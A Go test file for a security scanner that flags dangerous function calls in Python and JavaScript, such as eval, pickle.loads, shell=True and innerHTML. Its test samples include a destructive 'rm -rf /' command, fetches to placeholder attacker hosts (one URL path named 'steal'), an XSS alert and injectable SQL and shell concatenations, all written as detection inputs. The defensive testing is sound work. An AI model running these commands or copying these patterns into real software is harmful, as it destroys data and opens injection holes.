// SPDX-License-Identifier: Apache-2.0
package detectors

import (
	"testing"
)

// ====================================================================
// Pattern field validation
// ====================================================================

func TestDangerousFunctionPatternFields(t *testing.T) {
	for _, p := range DangerousFunctionPatterns {
		if p.Name == "" {
			t.Errorf("Pattern has empty Name: %+v", p)
		}
		if p.Severity == "" {
			t.Errorf("Pattern %s has empty Severity", p.Name)
		}
		if p.Regex == "" {
			t.Errorf("Pattern %s has empty Regex", p.Name)
		}
		if p.Description == "" {
			t.Errorf("Pattern %s has empty Description", p.Name)
		}
	}
}

func TestDangerousFunctionPatternsLoaded(t *testing.T) {
	if len(DangerousFunctionPatterns) == 0 {
		t.Error("DangerousFunctionPatterns should not be empty")
	}
	if len(CompiledDangerousFunctionPatterns) != len(DangerousFunctionPatterns) {
		t.Errorf("CompiledDangerousFunctionPatterns = %d, want %d", len(CompiledDangerousFunctionPatterns), len(DangerousFunctionPatterns))
	}
}

func TestDangerousFunctionCategoryConstant(t *testing.T) {
	if CategoryDangerousFunction != "dangerous_function" {
		t.Errorf("CategoryDangerousFunction = %s, want dangerous_function", CategoryDangerousFunction)
	}
}

// ====================================================================
// TestDangerousFunctions_DetectAll — test each pattern detects its target
// ====================================================================

func TestDangerousFunctions_DetectAll(t *testing.T) {
	// Generate a 120-char base64-like string for blob detection test
	blobChars := ""
	for i := 0; i < 120; i++ {
		blobChars += "A"
	}

	tests := []struct {
		name    string
		text    string
		pattern string
	}{
		{"py_eval", "result = eval(user_input)", "dangerous_py_eval"},
		{"py_exec", "exec(code_string)", "dangerous_py_exec"},
		{"py_os_system", "os.system('rm -rf /')", "dangerous_py_os_system"},
		{"py_subprocess_shell", "subprocess.run(cmd, shell=True)", "dangerous_py_subprocess_shell"},
		{"py_os_popen", "os.popen('ls')", "dangerous_py_os_popen"},
		{"py_import", "__import__('os')", "dangerous_py_import"},
		{"py_pickle_loads", "pickle.loads(data)", "dangerous_py_pickle_loads"},
		{"py_pickle_load", "pickle.load(f)", "dangerous_py_pickle_loads"},
		{"py_yaml_unsafe_load", "yaml.load(stream)", "dangerous_py_yaml_unsafe_load"},
		{"py_marshal_loads", "marshal.loads(data)", "dangerous_py_marshal_loads"},
		{"py_compile", "compile(src, '<string>', 'exec')", "dangerous_py_compile"},
		{"py_ctypes_cdll", "ctypes.CDLL('libfoo.so')", "dangerous_py_ctypes"},
		{"py_ctypes_windll", "ctypes.WinDLL('user32')", "dangerous_py_ctypes"},
		{"py_input_exec", "eval(input(prompt))", "dangerous_py_input_exec"},
		{"js_eval", "eval('alert(1)')", "dangerous_js_eval"},
		{"js_function_constructor", "new Function('return this')()", "dangerous_js_function_constructor"},
		{"js_child_process_exec", "child_process.exec('ls -la')", "dangerous_js_child_process_exec"},
		{"js_child_process_spawn", "child_process.spawn('node')", "dangerous_js_child_process_spawn"},
		{"js_set_timeout_string", "setTimeout('alert(1)', 100)", "dangerous_js_set_timeout_string"},
		{"js_set_interval_string", "setInterval('alert(1)', 1000)", "dangerous_js_set_interval_string"},
		{"js_document_write", "document.write('<h1>hi</h1>')", "dangerous_js_document_write"},
		{"js_inner_html", "el.innerHTML = userInput", "dangerous_js_inner_html"},
		{"sql_injection", `"SELECT * FROM users WHERE name = " + username`, "dangerous_sql_injection"},
		{"command_injection", "os.system('ls ' + user_input)", "dangerous_command_injection"},
		{"hardcoded_url", "requests.get('https://evil.example.org/data')", "dangerous_hardcoded_url_http"},
		{"base64_blob", "data = '" + blobChars + "'", "dangerous_base64_blob"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			results := DetectDangerousFunctions(tt.text)
			found := false
			for _, r := range results {
				if r.Category == tt.pattern {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("DetectDangerousFunctions(%q) did not find pattern %s", tt.text, tt.pattern)
			}
		})
	}
}

// ====================================================================
// TestDangerousFunctions_PythonCode — realistic Python code
// ====================================================================

func TestDangerousFunctions_PythonCode(t *testing.T) {
	pythonCode := `
import os
import pickle
import yaml
import marshal
import subprocess
import ctypes

def run_user_code(code_str):
    result = eval(code_str)
    exec(code_str + "\npass")
    os.system("ls -la /tmp")
    os.popen("whoami")
    subprocess.call(["cmd"], shell=True)
    data = pickle.loads(payload)
    config = yaml.load(stream)
    raw = marshal.loads(binary_data)
    code = compile(code_str, "<user>", "exec")
    lib = ctypes.CDLL("./malicious.so")
    mod = __import__("subprocess")
    val = eval(input("Enter expression: "))
    return result
`
	results := DetectDangerousFunctions(pythonCode)
	if len(results) == 0 {
		t.Fatal("DetectDangerousFunctions should detect dangerous patterns in Python code")
	}

	foundCategories := make(map[string]bool)
	for _, r := range results {
		foundCategories[r.Category] = true
	}

	expected := []string{
		"dangerous_py_eval",
		"dangerous_py_exec",
		"dangerous_py_os_system",
		"dangerous_py_subprocess_shell",
		"dangerous_py_os_popen",
		"dangerous_py_pickle_loads",
		"dangerous_py_yaml_unsafe_load",
		"dangerous_py_marshal_loads",
		"dangerous_py_compile",
		"dangerous_py_ctypes",
		"dangerous_py_import",
		"dangerous_py_input_exec",
	}

	for _, p := range expected {
		if !foundCategories[p] {
			t.Errorf("Expected pattern %s to be detected in Python code", p)
		}
	}
}

// ====================================================================
// TestDangerousFunctions_JavaScriptCode — realistic JS code
// ====================================================================

func TestDangerousFunctions_JavaScriptCode(t *testing.T) {
	jsCode := `
const child_process = require('child_process');

function processUserInput(input) {
    eval(input);
    const fn = new Function('return ' + input)();
    child_process.exec('ls -la /tmp');
    child_process.spawn('node', ['-e', input]);
    setTimeout('alert("xss")', 1000);
    setInterval('doSomething()', 500);
    document.write(input);
    element.innerHTML = input;
    return fn;
}
`
	results := DetectDangerousFunctions(jsCode)
	if len(results) == 0 {
		t.Fatal("DetectDangerousFunctions should detect dangerous patterns in JS code")
	}

	foundCategories := make(map[string]bool)
	for _, r := range results {
		foundCategories[r.Category] = true
	}

	expected := []string{
		"dangerous_js_eval",
		"dangerous_js_function_constructor",
		"dangerous_js_child_process_exec",
		"dangerous_js_child_process_spawn",
		"dangerous_js_set_timeout_string",
		"dangerous_js_set_interval_string",
		"dangerous_js_document_write",
		"dangerous_js_inner_html",
	}

	for _, p := range expected {
		if !foundCategories[p] {
			t.Errorf("Expected pattern %s to be detected in JS code", p)
		}
	}
}

// ====================================================================
// TestDangerousFunctions_SafeCode — safe code should NOT trigger
// ====================================================================

func TestDangerousFunctions_SafeCode(t *testing.T) {
	safeCode := `
import json
import logging
from pathlib import Path

def load_config(path):
    with open(path, 'r') as f:
        return json.load(f)

def process_data(data):
    result = [x * 2 for x in data if x > 0]
    logging.info(f"Processed {len(result)} items")
    return result

# Safe constants
MAX_RETRIES = 3
TIMEOUT_MS = 5000
API_VERSION = "v1"
`
	results := DetectDangerousFunctions(safeCode)
	// Filter out any false positives from patterns that shouldn't match
	// Safe code should have zero or very few matches
	for _, r := range results {
		t.Errorf("Safe code should not trigger pattern %s (matched: %q)", r.Category, r.Value)
	}
}

// ====================================================================
// TestDangerousFunctions_Base64Blob — test the base64 threshold
// ====================================================================

func TestDangerousFunctions_Base64Blob(t *testing.T) {
	// 100+ char base64 string should trigger
	longBlob := "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	results := DetectDangerousFunctions(longBlob)
	found := false
	for _, r := range results {
		if r.Category == "dangerous_base64_blob" {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected dangerous_base64_blob to detect 100+ char base64 string")
	}

	// Short base64 string should NOT trigger
	shortBlob := "SGVsbG8gV29ybGQ="
	results = DetectDangerousFunctions(shortBlob)
	for _, r := range results {
		if r.Category == "dangerous_base64_blob" {
			t.Error("Short base64 string should not trigger dangerous_base64_blob")
		}
	}
}

// ====================================================================
// TestDangerousFunctions_HTTPURL — test URL detection with localhost exclusion
// ====================================================================

func TestDangerousFunctions_HTTPURL(t *testing.T) {
	// External URL should trigger
	results := DetectDangerousFunctions("fetch('https://api.evilcorp.com/steal')")
	found := false
	for _, r := range results {
		if r.Category == "dangerous_hardcoded_url_http" {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected dangerous_hardcoded_url_http to detect external URL")
	}

	// Localhost and IP addresses should NOT trigger (no dot+TLD structure)
	localhostURLs := []string{
		"http://localhost:8080/api",
		"http://127.0.0.1:3000",
		"http://0.0.0.0:9090",
		"http://[::1]:8080",
	}

	for _, url := range localhostURLs {
		results := DetectDangerousFunctions(url)
		for _, r := range results {
			if r.Category == "dangerous_hardcoded_url_http" {
				t.Errorf("URL %q should not trigger dangerous_hardcoded_url_http (localhost/IP excluded)", url)
			}
		}
	}
}

// ====================================================================
// TestDangerousFunctions_EmptyText — empty string should return nil
// ====================================================================

func TestDangerousFunctions_EmptyText(t *testing.T) {
	results := DetectDangerousFunctions("")
	if results != nil {
		t.Errorf("DetectDangerousFunctions on empty string should return nil, got %d", len(results))
	}
}
